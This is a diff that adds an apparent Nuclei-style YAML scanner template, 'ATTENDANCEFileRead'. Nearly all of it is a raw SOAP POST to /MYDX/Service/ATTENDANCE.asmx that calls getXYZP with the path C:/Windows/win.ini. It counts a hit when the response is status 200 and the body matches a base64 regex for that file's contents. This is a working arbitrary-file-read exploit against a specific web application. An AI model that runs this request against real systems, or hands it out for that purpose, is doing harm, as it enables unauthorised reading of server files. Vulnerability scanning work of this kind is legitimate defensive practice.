@@ -1,0 +1,28 @@
+id: ATTENDANCEFileRead
+
+info:
+  name: ATTENDANCEFileRead
+  author: Momika233
+  severity: high
+  reference:
+    - https://github.com/momika233
+  tags: ATTENDANCEFileRead
+
+requests:
+  - raw:
+      - |
+        POST /MYDX/Service/ATTENDANCE.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><getXYZP xmlns="http://tempuri.org/"><path>C:/Windows/win.ini</path></getXYZP></soap:Body></soap:Envelope>
+   matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "OyBmb3I.*"
+        part: body
+
+      - type: status
+        status:
+          - 200
